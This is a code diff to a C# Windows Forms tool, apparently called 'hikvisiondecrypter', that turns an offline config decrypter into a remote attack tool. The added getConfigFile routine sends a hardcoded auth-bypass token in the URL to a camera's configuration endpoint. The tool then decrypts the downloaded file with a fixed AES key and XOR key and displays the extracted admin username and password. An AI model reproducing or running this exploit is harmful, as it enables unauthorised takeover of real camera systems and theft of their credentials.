@@ -1,9 +1,16 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
 using System.IO;
+using System.Linq;
+using System.Net;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace hikvisiondecrypter
@@ -15,26 +22,187 @@ namespace hikvisiondecrypter
             InitializeComponent();
         }
 
-        public void doDecrypt(string[] FileList)
+        public string textlog = "";
+        public string outputrg = "";
+
+        public void getConfigFile(string ip)
+        {
+            Console.WriteLine(ip);
+            WebClient w = new WebClient();
+            string location = "/System/configurationFile?auth=YWRtaW46MTEK";
+            if (!checkBox2.Checked)
+            {
+                try
+                {
+                    textlog = "Downloading config... (this may take some time)\r\n" + textlog;
+                    textBox1.Text = textlog;
+                    string uri;
+                    ip = ip.ToLower();
+                    if(ip.Contains("http") || ip.Contains("https")){
+                        uri = ip + location;
+                    }
+                    else
+                    {
+                        uri = "http://" + ip + location;
+                    }
+                    WebRequest request = WebRequest.Create(uri);
+                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                    if (response == null || response.StatusCode != HttpStatusCode.OK)
+                    {
+                        textlog = "Download failed (" + response.StatusCode.ToString() + ").\r\n" + textlog;
+                        textBox1.Text = textlog;
+                        return;
+                    }
+
+
+                    new Thread(() =>
+                    {
+                        byte[] tempdata = w.DownloadData(uri);
+                        this.Invoke(new MethodInvoker(delegate ()
+                        {
+                            doDecrypt(new string[0], tempdata, 1);
+                        }));
+                    }).Start();
+
+
+                }
+                catch(WebException ex)
+                {
+                    Console.WriteLine(ex.Message);
+                    if (ex.Status == WebExceptionStatus.ProtocolError)
+                    {
+                        var response = ex.Response as HttpWebResponse;
+                        if (response != null)
+                        {
+                            textlog = "Download failed (" + response.StatusCode.ToString() + ").\r\n" + textlog;
+                            textBox1.Text = textlog;
+                            return;
+                        }
+                        else
+                        {
+
+                        }
+                    }
+                    else
+                    {
+
+                    }
+                }
+                catch(Exception ex)
+                {
+                    textlog = "Download failed (Malformed URl).\r\n" + textlog;
+                    textBox1.Text = textlog;
+                    return;
+                }
+            }
+            else
+            {
+                using (SaveFileDialog dlg = new SaveFileDialog())
+                {
+                    dlg.Title = "Save Config File";
+
+                    if (dlg.ShowDialog() == DialogResult.OK)
+                    {
+                        textlog = "Downloading config... (this may take some time)\r\n" + textlog;
+                        textBox1.Text = textlog;
+
+                        try
+                        {
+                            string uri;
+                            ip = ip.ToLower();
+                            if (ip.Contains("http") || ip.Contains("https"))
+                            {
+                                uri = ip + location;
+                            }
+                            else
+                            {
+                                uri = "http://" + ip + location;
+                            }
+
+                            new Thread(() =>
+                            {
+                                Thread.CurrentThread.IsBackground = true;
+                                w.DownloadFile(uri, dlg.FileName);
+                                this.Invoke(new MethodInvoker(delegate ()
+                                {
+                                    textlog = "Download complete\r\n" + textlog;
+                                    textBox1.Text = textlog;
+                                }));
+                            }).Start();
+                        }
+                        catch (WebException ex)
+                        {
+                            if (ex.Status == WebExceptionStatus.ProtocolError)
+                            {
+                                var response = ex.Response as HttpWebResponse;
+                                if (response != null)
+                                {
+                                    textlog = "Download failed (" + response.StatusCode.ToString() + ").\r\n" + textlog;
+                                    textBox1.Text = textlog;
+                                }
+                                else
+                                {
+
+                                }
+                            }
+                            else
+                            {
+
+                            }
+                        }
+                    }
+                }
+            }
+            return;
+        }
+
+        public void doDecrypt(string[] FileList, byte[] data, int mode)
         {
             byte[] key = { 0x73, 0x8B, 0x55, 0x44 };
-            byte[] fileContents = File.ReadAllBytes(FileList[0]);
+            byte[] fileContents;
+
+            if(mode == 0)
+            {
+                fileContents = File.ReadAllBytes(FileList[0]);
+            }
+            else
+            {
+                fileContents = data;
+            }
+
             byte[] xorOutput = new byte[fileContents.Length];
 
-            byte[] decryptedData = Decrypt(fileContents);
+            textlog = "Decrypting...\r\n" + textlog;
+            textBox1.Text = textlog;
 
-            Console.WriteLine(FileList[0]);
+            byte[] decryptedData = null;
 
+            try
+            {
+                decryptedData = Decrypt(fileContents);
+            }
+            catch (Exception ex)
+            {
+                textlog = "Decrypt failure!\r\n";
+                textBox1.Text = textlog;
+                Form msg = new msg(ex.Message);
+                msg.Show();
+                return;
+            }
+
+            textlog = "XORing...\r\n" + textlog;
+            textBox1.Text = textlog;
             for (int i = 0; i < decryptedData.Length; i++)
             {
                 xorOutput[i] = (byte)(decryptedData[i] ^ key[i % key.Length]);
             }
 
             string output = Encoding.UTF8.GetString(xorOutput);
-            string outputrg;
 
             string upass = "";
 
+            textlog = "Attempting to find username and password...\r\n" + textlog;
+            textBox1.Text = textlog;
             for (int o = 0; o < 100; o++)
             {
                 upass = upass + output[634525 + o];
@@ -65,20 +233,12 @@ namespace hikvisiondecrypter
 
             }
 
-            try
-            {
-                string username = upasslist[positions[0]];
-                string password = upasslist[positions[1]];
+            string username = upasslist[positions[0]];
+            string password = upasslist[positions[1]];
 
-                label2.Text = string.Format("USERNAME: {0}", username);
-                label3.Text = string.Format("PASSWORD: {0}", password);
-            }
-            catch
-            {
-                label2.Text = string.Format("AUTOMATIC PASSWORD GET FAILED");
-                label3.Text = string.Format("USE MANUAL METHOD");
-            }
-            
+            label2.Text = string.Format("USERNAME: {0}", username);
+            label3.Text = string.Format("PASSWORD: {0}", password);
+
             if (checkBox1.Checked)
             {
                 Regex rgx = new Regex("[^a-zA-Z0-9 -]");
@@ -89,35 +249,32 @@ namespace hikvisiondecrypter
                 outputrg = output;
             }
 
-            using (SaveFileDialog dlg = new SaveFileDialog())
+            if((username == "") || (password == ""))
             {
-                dlg.Title = "Open Output File";
-                dlg.Filter = "Text Files | *.txt";
-
-                if (dlg.ShowDialog() == DialogResult.OK)
+                textlog = "Could not find username and password, please find manually!\r\n" + textlog;
+                textBox1.Text = textlog;
+                using (SaveFileDialog dlg = new SaveFileDialog())
                 {
-                    string SafeFileName = Path.GetFileName(dlg.FileName);
-                    File.WriteAllText(dlg.FileName, outputrg);
+                    dlg.Title = "Open Output File";
+                    dlg.Filter = "Text Files | *.txt";
+
+                    if (dlg.ShowDialog() == DialogResult.OK)
+                    {
+                        string SafeFileName = Path.GetFileName(dlg.FileName);
+                        File.WriteAllText(dlg.FileName, outputrg);
+                    }
                 }
             }
-        }
-
-        private void Form_DragEnter(object sender, DragEventArgs e)
-        {
-            string[] FileList = (string[])e.Data.GetData(DataFormats.FileDrop, false);
-            try
+            else
             {
-                doDecrypt(FileList);
+                textlog = "Found username and password!\r\n" + textlog;
+                textBox1.Text = textlog;
             }
-            catch
-            {
-
-            }
-
         }
 
         public static byte[] Decrypt(byte[] cipherText)
         {
+
             byte[] cipherBytes = cipherText;
             using (Aes encryptor = Aes.Create())
             {
@@ -135,6 +292,24 @@ namespace hikvisiondecrypter
                 }
             }
             return cipherText;
+
+        }
+
+        private void Form_DragEnter(object sender, DragEventArgs e)
+        {
+            string[] FileList = (string[])e.Data.GetData(DataFormats.FileDrop, false);
+            try
+            {
+                doDecrypt(FileList, new byte[0], 0);
+            }
+            catch(Exception ex)
+            {
+                textlog = "Decrypt failure!\r\n";
+                textBox1.Text = textlog;
+                Form msg = new msg(ex.Message);
+                msg.Show();
+            }
+
         }
 
         public static byte[] FromHex(string hex)
@@ -148,11 +323,6 @@ namespace hikvisiondecrypter
             return raw;
         }
 
-        private void Form1_Load(object sender, EventArgs e)
-        {
-
-        }
-
         private void button1_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog dlg = new OpenFileDialog())
@@ -164,7 +334,7 @@ namespace hikvisiondecrypter
                     string[] file = new string[] { dlg.FileName };
                     try
                     {
-                        doDecrypt(file);
+                        doDecrypt(file, new byte[0], 0);
                     }
                     catch
                     {
@@ -172,6 +342,33 @@ namespace hikvisiondecrypter
                     }
                 }
             }
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            using (SaveFileDialog dlg = new SaveFileDialog())
+            {
+                dlg.Title = "Open Output File";
+                dlg.Filter = "Text Files | *.txt";
+
+                if (dlg.ShowDialog() == DialogResult.OK)
+                {
+                    string SafeFileName = Path.GetFileName(dlg.FileName);
+                    File.WriteAllText(dlg.FileName, outputrg);
+                }
+            }
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            Form about = new about();
+            about.Show();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            getConfigFile(textBox2.Text);
+            //button2.Enabled = false;
         }
     }
 }
